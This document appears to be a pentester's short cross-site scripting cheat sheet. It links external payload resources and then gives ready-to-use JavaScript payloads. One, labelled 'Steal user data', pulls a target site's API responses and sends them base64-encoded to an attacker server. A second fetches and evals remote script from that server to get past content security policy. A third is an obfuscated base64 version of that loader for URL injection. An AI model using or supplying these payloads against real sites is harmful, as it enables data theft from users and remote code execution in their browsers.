# XSS
## Useful resources
* [PortSwigget cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
* [OWASP evasion cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
* [XSS Payloads](http://www.xss-payloads.com/)

## Tips
* When the name of the file is reflected in a page, try adding a `/` to the end to circumvent 404s

---


Steal user data, host this on your server:

```jsx
function fe(t) {
    fetch(t).then(t => t.text()).then(t => {
        fetch("https://my-server.com/log/?p=" + btoa(t))
    })
}
urls = ["https://█████.com/v1/api/.../...",
        "https://█████.com/v2/api/.../...",
        "https://█████.com/v3/api/.../..."
        ...
], urls.forEach(fe);
```

And call it with this to bypass CSP:

```jsx
!async function() {
    let a = await
    function() {
        fetch('https://my-server.com/log.js').then(t => t.text()).then(d => {
            eval(d)
        })
    }()
}();
```

If you have to pass it in URL use this payload:

```jsx
eval(atob(decodeURIComponent('IWFzeW5jIGZ1bmN0aW9uKCkge2xldCBhID0gYXdhaXQgZnVuY3Rpb24oKSB7ZmV0Y2goJ2h0dHBzOi8vbXktc2VydmVyLmNvbS9sb2cuanMnKS50aGVuKHQgPT4gdC50ZXh0KCkpLnRoZW4oZCA9PiB7ZXZhbChkKX0pfSgpfSgpOwo=')))
```
